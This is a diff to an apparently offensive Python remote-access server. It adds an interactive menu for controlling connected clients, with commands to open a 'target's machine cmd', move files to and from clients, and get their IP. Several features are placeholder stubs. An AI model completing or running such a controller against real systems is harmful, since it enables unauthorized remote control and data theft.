@@ -38,20 +38,23 @@ logo = red + r"""
 def help():
     """ Help Menu """
     print(green + """
-    |--------------------| -----------------------------------------|
+    |---------------------------------------------------------------|
     |      Commands      |                Description               |
-    |--------------------| -----------------------------------------|
+    |---------------------------------------------------------------|
+    |-----------------------Main Menu-------------------------------|
     |       help         | Display help menu                        |
     |       list         | List the connected clients               |
     |       0            | Broadcast to all clients                 |
     |       <clientId>   | Interract with client                    |
-    |       kill         | Kill connection with client              |
     |       exit         | Stop the server                          |
+    |---------------------Interracting mode-------------------------|
+    |       kill         | Kill connection with client              |
+    |       opencmd      | Open the target's machine cmd            |
     |       download     | Download file/directory from client      |
     |       upload       | Upload file/directory to client          |
     |       cd           | Browse to a directory                    |
     |       getip        | Get the clients public IP                |
-    |--------------------| -----------------------------------------|
+    |---------------------------------------------------------------|
     """ + reset)
 
 def window_title(clients):
@@ -66,7 +69,7 @@ def get_client_by_index(clients, choice):
     client_list = list(clients.items()) 
     if 1 <= choice <= len(client_list):
         addr, client_socket = client_list[choice - 1]  
-        return client_socket, addr  
+        return addr, client_socket  
     else:
         print(f"{red}Invalid choice. Type 'list' for the connected clients{reset}")
         return None, None
@@ -78,8 +81,9 @@ def handle_client(socket):
             try:
                 client_socket, addr = socket.accept()
                 clients[addr] = client_socket
-                print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}")
+                print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}\n\n{cyan}Main>{reset} ", end="", flush=True)
                 window_title(clients)
+                
 
                 threading.Thread(target=handle_client_commands, args=(client_socket, addr), daemon=True).start()
 
@@ -96,7 +100,7 @@ def handle_client_commands(client_socket, addr):
             if not command:
                  break
     except (ConnectionResetError, ConnectionAbortedError):
-        print(f"{red}[-]{reset} Client {addr[0]} disconnected\n")
+        print(f"\n{red}[-]{reset} Client {addr[0]} disconnected")
         client_socket.close()
         if addr in clients:
             del clients[addr]
@@ -134,16 +138,41 @@ def recvall(sock, n):
         print(f"{red}Receive all failed: {e}{reset}")
 
 def download():
-    pass
+    print("Download logic")
 
 def save_file():
     pass
 
 def upload():
-    pass
+    print("Upload logic")
 
 def send_file():
     pass
+
+def command_handler(cl_addr, cl_socket):
+    while True:
+        try:
+            ip, port = cl_addr
+            cmd = input(f"\n{cyan}[$]{reset} {blue}{ip}:{port}>{reset} ").lower().strip()
+            if cmd == "kill":
+               cl_socket.send(cmd.encode()) 
+               cl_socket.close()
+               return
+            elif cmd == "opencmd":
+                cl_socket.send(cmd.encode())
+                response = "response"
+            elif cmd == "download":
+                print("download logic")
+            elif cmd == "upload":
+                print("upload logic")
+            elif cmd == "getip":
+                print("getip logic")
+            elif cmd == "back":
+                return
+            else:
+                print(f"{red}Invalid command. Type 'back' to Main Menu and 'list' for the available commands{reset}")
+        except (ConnectionResetError, OSError) as e:
+            print(f"\n{red}[-]{reset} Connection lost: {e}")
 
 def start_server(lhost, lport):
     global server_active
@@ -157,36 +186,36 @@ def start_server(lhost, lport):
         print(yellow + "[*] Server Started On {}:{} < at [{}]".format(lhost, lport, datetime.now().strftime("%H:%M:%S")) + reset)
         threading.Thread(target=handle_client, args=(sock,), daemon=True).start()
 
-        while server_active:
-            if clients: 
-                try:
-                    cmd = input(f"\n{cyan}Main>{reset} ").strip().lower()
+        while server_active: 
+            try:
+                cmd = input(f"\n{cyan}Main>{reset} ").strip().lower()
+                
+                if cmd == "help":
+                    help()
+
+                elif cmd == "list":
+                    list_clients(clients)  
+
+                elif cmd == "0":
+                    print(f"{yellow}[*]{reset} Broadcast mode (to implement)")    
                     
-                    if cmd == "help":
-                        help()
-
-                    elif cmd == "list":
-                        list_clients(clients)  
-
-                    elif cmd == "0":
-                        print(f"{yellow}[*]{reset} Broadcast mode (to implement)")    
-                        
-                    elif cmd.isdigit():
-                        client_socket, addr = get_client_by_index(clients, int(cmd))
-                        if client_socket:
-                            ip, port = addr
-                            print(f"{yellow}[*]{reset} Interracting with {ip}:{port}> (to implement interaction)")
-                      
-                    elif cmd == "exit":
-                        print(f"{yellow}[*]{reset} Shutting down the server...")
-                        server_active = False
-                        
-                    else:
-                        print(f"{red}[-]{reset} Unknown command. Type 'help'")
-                        
-                except (OSError, EOFError, ValueError) as e:
-                    print(f"\n{red}[!]{reset} Error: {e}{reset}")
-                    continue
+                elif cmd.isdigit():
+                    addr, client_socket = get_client_by_index(clients, int(cmd))
+                    if client_socket:
+                        ip, port = addr
+                        print(f"{yellow}[*]{reset} Interracting with {ip}:{port} ")
+                        command_handler(addr, client_socket)
+                  
+                elif cmd == "exit":
+                    print(f"{yellow}[*]{reset} Shutting down the server...")
+                    server_active = False
+                    
+                else:
+                    print(f"{red}[-]{reset} Unknown command. Type 'help'")
+                    
+            except (OSError, EOFError, ValueError) as e:
+                print(f"\n{red}[!]{reset} Error: {e}{reset}")
+                continue
 
     except (KeyboardInterrupt, EOFError):
         print("\nShutting down server...")
